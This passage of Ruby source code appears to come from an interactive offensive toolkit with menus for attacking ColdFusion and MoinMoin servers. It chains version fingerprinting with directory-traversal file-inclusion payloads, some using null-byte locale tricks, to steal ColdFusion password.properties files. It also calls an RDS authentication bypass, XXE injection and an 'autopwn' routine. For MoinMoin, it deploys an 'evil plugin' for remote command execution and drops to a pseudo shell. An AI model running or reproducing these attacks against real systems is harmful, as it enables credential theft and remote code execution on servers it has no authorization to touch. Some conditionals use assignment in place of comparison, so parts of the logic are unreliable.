      coldfusion_version = Readline.readline("   Enter CF Version: ", true)
      puts
      case coldfusion_version.strip.chomp.to_i
      when 9
        cf = Coldfusion.new(@target)
        o = cf.ent_vs_std
        if o[0] = 'Linux'
          os=2
        elsif o[0] = 'Windows'
          os=1
        else
          os=0
        end
        print_status("Trying to trigger l10n parsing LFI......")
        os = cf.os_lion_check if os.to_i == 0
        if os.to_i == 1
          if not cf.subzero('..\..\..\..\..\..\..\..\..\ColdFusion9\lib\password.properties')
            if not cf.subzero('..\..\..\..\..\..\..\..\..\ColdFusion9\cfusion\lib\password.properties')
              if not cf.subzero('..\..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties')
                print_error("l10n parsing LFI Not Working! :(")
              end
            end
          end
        else
          if not cf.subzero('../../../../../../../../../opt/coldfusion9/cfusion/lib/password.properties')
            if not cf.subzero('../../../../../../../../../opt/coldfusion/cfusion/lib/password.properties')
              print_error("l10n parsing LFI Not Working! :(")
            end
          end
        end
      when 10
        cf = Coldfusion.new(@target)
        o = cf.ent_vs_std
        if o[0] = 'Linux'
          os=2
        elsif o[0] = 'Windows'
          os=1
        else
          os=0
        end
        print_status("Trying to trigger l10n parsing LFI......")
        os = cf.os_lion_check if os.to_i == 0
        if os.to_i == 1
          if not cf.subzero('..\..\..\..\..\..\..\..\..\ColdFusion10\lib\password.properties')
            if not cf.subzero('..\..\..\..\..\..\..\..\..\ColdFusion10\cfusion\lib\password.properties')
              if not cf.subzero('..\..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties')
                print_error("l10n parsing LFI Not Working! :(")
              end
            end
          end
        else
          if not cf.subzero('../../../../../../../../../opt/coldfusion10/cfusion/lib/password.properties')
            if not cf.subzero('../../../../../../../../../opt/coldfusion/cfusion/lib/password.properties')
              print_error("l10n parsing LFI Not Working! :(")
            end
          end
        end
      else
        puts
        print_error("Target Version is NOT Supported by this Attack!\n\n")
      end
      coldfusion_menu(@target)
    when /^rds.bypass$|^rds$|^misconfig/i
      cf = Coldfusion.new(@target)
      cf.rds_auth_bypass
      coldfusion_menu(@target)
    when /xee$|^xee.shell$/i
      cf = Coldfusion.new(@target)
      cf.xee
      coldfusion_menu(@target)
    when /^auto$|^autopwn$|^automagic$/i
      cf = Coldfusion.new(@target)
      cf.ent_vs_std
      coldfusion_version = cf.md5_version_check
      if coldfusion_version.nil?
        coldfusion_version = cf.planb_version_check
        if coldfusion_version.nil?
          coldfusion_version = cf.wsdl_version_check
          if coldfusion_version.nil?
            coldfusion_version = cf.rds_version_check
            if coldfusion_version.nil?
              puts
              print_error("Epic Fail - Unable to Determine Version Info!")
              answer = Readline.readline("   Manually set version to continue (Y/N)?: ", true)
              if answer.strip.chomp.upcase[0] == 'Y'
                coldfusion_version = Readline.readline("Enter CF Version: ", true)
              else
                puts
                print_error("OK, returning to CF Menu....\n\n")
                coldfusion_menu(@target)
              end
            end
          end
        end
      end
      puts
      case coldfusion_version.to_s.strip.chomp.to_i
      when 6
        print_status("Trying to trigger Locale LFI......")
        if not cf.old_lfi('locale=..\..\..\..\..\..\..\..\CFusionMX\lib\password.properties%00en')
	  if not cf.old_lfi('locale=..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties%00en')
            puts "Locale LFI Not Working".light_red + "! :(\n".white
            puts "Checking for XEE Injection".light_red + ".....".white
            cf.xee
          end
        end
      when 7
        print_error("Trying to trigger Locale LFI....")
        if not cf.old_lfi('locale=..\..\..\..\..\..\..\..\CFusionMX7\lib\password.properties%00en')
          if not cf.old_lfi('locale=..\..\..\..\..\..\..\..\opt\coldfusionmx7\lib\password.properties%00en')
            if not cf.old_lfi('locale=..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties%00en')
              print_error("Locale LFI Not Working! :(\n")
              print_status("Checking for XEE Injection".light_red + ".....")
              cf.xee
            end
          end
        end
      when 8
        print_status("Trying to trigger Locale LFI......")
        if not cf.old_lfi('locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en')
          if not cf.old_lfi('locale=..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties%00en')
            print_error("Locale LFI Not Working! :(\n")
            print_status("Checking for XEE Injection.....")
            cf.xee
          end
        end
      when 9
        print_status("Trying RDS Auth Bypass......")
        if not cf.rds_auth_bypass
          print_status("Trying to trigger l10n parsing LFI......")
          cf.os_lion_check if @os.to_i == 0
          if @os.to_i == 1
            if not cf.subzero('..\..\..\..\..\..\..\..\..\ColdFusion9\lib\password.properties')
              if not cf.subzero('..\..\..\..\..\..\..\..\..\ColdFusion9\cfusion\lib\password.properties')
                if not cf.subzero('..\..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties')
                  print_error("l10n parsing LFI Not Working! :(")
                  print_status("Checking for XEE Injection.....")
                  cf.xee
                end
              end
            end
          else
            if not cf.subzero('../../../../../../../../../opt/coldfusion9/cfusion/lib/password.properties')
              if not cf.subzero('../../../../../../../../../opt/coldfusion/cfusion/lib/password.properties')
                print_error("l10n parsing LFI Not Working! :(")
                print_status("Checking for XEE Injection.....")
                cf.xee
              end
            end
          end
        end
      when 10
        print_status("Trying RDS Auth Bypass......")
        if not cf.rds_auth_bypass
          print_status("Trying to trigger l10n parsing LFI......")
          cf.os_lion_check if @os.to_i == 0
          if @os.to_i == 1
            if not cf.subzero('..\..\..\..\..\..\..\..\..\ColdFusion10\lib\password.properties')
              if not cf.subzero('..\..\..\..\..\..\..\..\..\ColdFusion10\cfusion\lib\password.properties')
                if not cf.subzero('..\..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties')
                  print_error("l10n parsing LFI Not Working! :(")
                  print_status("Checking for XEE Injection.....")
                  cf.xee
                end
              end
            end
          else
            if not cf.subzero('../../../../../../../../../opt/coldfusion10/cfusion/lib/password.properties')
              if not cf.subzero('../../../../../../../../../opt/coldfusion/cfusion/lib/password.properties')
                print_error("l10n parsing LFI Not Working! :(")
                print_status("Checking for XEE Injection.....")
                cf.xee
              end
            end
          end
        end
      else
        puts
        print_error("Target Version is NOT Supported!\n\n")
      end
      coldfusion_menu(@target)
    when /^fckeditor$|^uploader$/i
      coldfusion_version = Readline.readline("   Enter CF Version: ", true)
      puts
      case coldfusion_version.strip.chomp.to_i
      when 8
        print_error("Under maintenance. check back later....")
      else
        puts
        print_error("Target Version NOT Supported by this Attack!\n\n")
      end
      coldfusion_menu(@target)
    else
      puts
      print_error("Oops, Didn't quite understand that one!")
      print_error("Please try again...\n\n")
      coldfusion_menu(@target)
    end
  end
end

# MoinMoin Help Menu
def moinmoin_usage
  puts "Available Options for MoinMoin Menu: ".underline.white
  puts "back ".light_yellow + "     => ".white + "Return to Main Menu".light_red
  puts "exploit".light_yellow + "   => ".white + "MoinMoin RCE Exploit".light_red
end

# MoinMoin Wiki
def moinmoin_menu
  puts
  prompt = "(mo1n)> "
  while line = Readline.readline("#{prompt}", true)
    cmd = line.chomp
    case cmd
    when /^c$|^clear$|^cls$/i
      cls
      banner
      moinmoin_menu
    when /^h$|^help$|^ls$/i
      puts
      moinmoin_usage
      moinmoin_menu
    when /^exit$|^quit$|^back$/i
      puts
      print_error("Returning to previous menu....")
      special_menu
    when /^!(.+)/
      cmd=$1.strip.chomp
      res = commandz(cmd)
      print_line("\n#{res.join().chomp}")
      moinmoin_menu
    when /^local$|^OS$/i
      local_shell
      moinmoin_menu
    when /^config$/i
      print_status("Current Configuration: ")
      pp $config
      moinmoin_menu
    when /^ip$/i
      ip_info
      moinmoin_menu
    when /^ip2host$|^host2ip$/i
      host = Readline.readline("   Target IP or Domain: ", true)
      dnsenum = DNSEnum.new(host.strip.chomp)
      ip, domain, hostname = dnsenum.host_info
      puts
      print_status("IP: #{ip}")
      print_status("Domain: #{domain}") unless domain == ip
      print_status("Hostname: #{hostname}\n\n")
      moinmoin_menu
    when /^exploit$/i
      target = Readline.readline("   Enter Target IP: ", true)
      answer = Readline.readline("   Custom Path Prefix Needed (Y/N)?: ", true)
      if answer[0].upcase == 'Y'
        p = Readline.readline("   Enter Path Prefix: ", true)
        path_prefix = p.strip.chomp.sub(/\/$/, '') + '/'
      else
        path_prefix = ''
      end
      puts
      print_status("Checking for MoinMoin RCE Vuln...")
      moin=MoinMoin.new(target.strip.chomp, path_prefix)
      if moin.get_ticket
        print_good("Obtained valid ticket!")
        print_status("Trying to create new plugin....")
        param = moin.deploy_evil_plugin
        if not param.nil?
          print_good("Plugin Deployed!")
          print_status("Dropping to Pseudo Shell now...")
          moin.pseudo_shell
          print_good("Shell Location: http://#{target.strip.chomp}/#{path_prefix}moin/WikiSandBox?action=moinexec&#{param}=_COMMAND_")
        else
          puts
          print_error("Problem deploying evil plugin!")
          print_error("Can't continue as a result....\n")
        end
      else
        puts
        print_error("Unable to obtain a valid ticket!")
        print_error("Can't continue as a result....\n")
      end
      moinmoin_menu
    else
      puts
      print_error("Oops, Didn't quite understand that one!")
      print_error("Please try again...\n\n")
      ipb_menu
    end
  end
end
